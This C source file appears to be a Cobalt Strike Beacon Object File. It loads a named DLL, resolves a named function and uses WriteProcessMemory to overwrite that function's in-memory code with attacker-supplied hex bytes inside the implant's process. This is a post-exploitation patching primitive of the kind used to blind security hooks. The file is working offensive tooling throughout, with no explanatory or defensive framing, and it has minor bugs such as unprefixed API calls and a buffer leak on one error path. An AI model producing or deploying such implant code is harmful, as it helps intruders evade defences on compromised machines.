#include <windows.h>
#include "beacon.h"

WINBASEAPI FARPROC WINAPI KERNEL32$GetProcAddress (HMODULE, LPCSTR);
WINBASEAPI HANDLE WINAPI KERNEL32$GetCurrentProcess (VOID);
WINBASEAPI HMODULE WINAPI KERNEL32$GetModuleHandleA (LPCSTR);
WINBASEAPI HMODULE WINAPI KERNEL32$LoadLibraryA (LPCSTR);
WINBASEAPI WINBOOL WINAPI KERNEL32$WriteProcessMemory (HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T* );
WINBASEAPI HANDLE WINAPI KERNEL32$GetProcessHeap (VOID);
WINBASEAPI LPVOID WINAPI KERNEL32$HeapAlloc (HANDLE, DWORD, SIZE_T);
WINBASEAPI WINBOOL WINAPI KERNEL32$HeapFree (HANDLE, DWORD, LPVOID);
WINBASEAPI WINBOOL WINAPI KERNEL32$CloseHandle (HANDLE hObject);

// Function to calculate the length of a null-terminated string
size_t custom_strlen(const char *str) {
    const char *s = str;
    while (*s) ++s;
    return s - str;
}

// Function to convert a single hex character to its integer value
int hexCharToInt(char c) {
    if (c >= '0' && c <= '9') return c - '0';
    if (c >= 'a' && c <= 'f') return c - 'a' + 10;
    if (c >= 'A' && c <= 'F') return c - 'A' + 10;
    return -1; // Invalid character
}

// Function to convert a hex string to a byte array
void hexStringToBytes(char *hexString, BYTE *buffer, int bufferSize) {
    for (int i = 0; i < bufferSize; i++) {
        int highNibble = hexCharToInt(hexString[i * 2]);
        int lowNibble = hexCharToInt(hexString[i * 2 + 1]);
        if (highNibble == -1 || lowNibble == -1) {
            BeaconPrintf(CALLBACK_ERROR, "Invalid hex character found: %c%c\n", hexString[i * 2], hexString[i * 2 + 1]);
            return;
        }
        buffer[i] = (highNibble << 4) | lowNibble;
    }
}

void go(char *args, int length) {
    char *dllName;
    char *functionName;
    int startIndex;
    char *hexInput;
    int numberOfBytes;
    HMODULE hModule;
    FARPROC functionAddress;
    SIZE_T bytesWritten;
    BYTE *buffer;

    // Initialize the data parser
    datap parser;
    BeaconDataParse(&parser, args, length);

    // Extract arguments
    dllName = BeaconDataExtract(&parser, NULL);
    functionName = BeaconDataExtract(&parser, NULL);
    startIndex = BeaconDataInt(&parser);
    hexInput = BeaconDataExtract(&parser, NULL);

    numberOfBytes = custom_strlen(hexInput) / 2; // Each byte is represented by two hex characters

    // Allocate buffer dynamically
    buffer = (BYTE*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), 0, numberOfBytes);
    if (!buffer) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to allocate memory for buffer.\n");
        return;
    }

    // Convert hex string to byte array
    hexStringToBytes(hexInput, buffer, numberOfBytes);

    // Attempt to load the DLL if it's not already loaded
    hModule = GetModuleHandleA(dllName);
    if (hModule == NULL) {
        hModule = LoadLibraryA(dllName);
        if (hModule == NULL) {
            BeaconPrintf(CALLBACK_ERROR, "[!] Failed to load DLL: %s", dllName);
            return;
        }
        BeaconPrintf(CALLBACK_OUTPUT, "[+] DLL %s loaded successfully.", dllName);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] DLL %s already loaded.", dllName);
    }

    // Get function address
    functionAddress = KERNEL32$GetProcAddress(hModule, functionName);
    if (!functionAddress) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to get function address for: %s\n", functionName);
        KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, buffer);
        return;
    }

    // Calculate target address
    void *targetAddress = (void*)((BYTE*)functionAddress + startIndex);

    // Open the current process
    HANDLE hProcess = KERNEL32$GetCurrentProcess();
    if (!hProcess) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to open process.\n");
        KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, buffer);
        return;
    }

    // Write memory
    if (KERNEL32$WriteProcessMemory(hProcess, targetAddress, buffer, numberOfBytes, &bytesWritten)) {
        BeaconPrintf(CALLBACK_OUTPUT, "Wrote %d bytes to address %p\n", bytesWritten, targetAddress);
    } else {
        BeaconPrintf(CALLBACK_ERROR, "Failed to write memory.\n");
    }

    // Clean up
    KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, buffer);
    KERNEL32$CloseHandle(hProcess);
}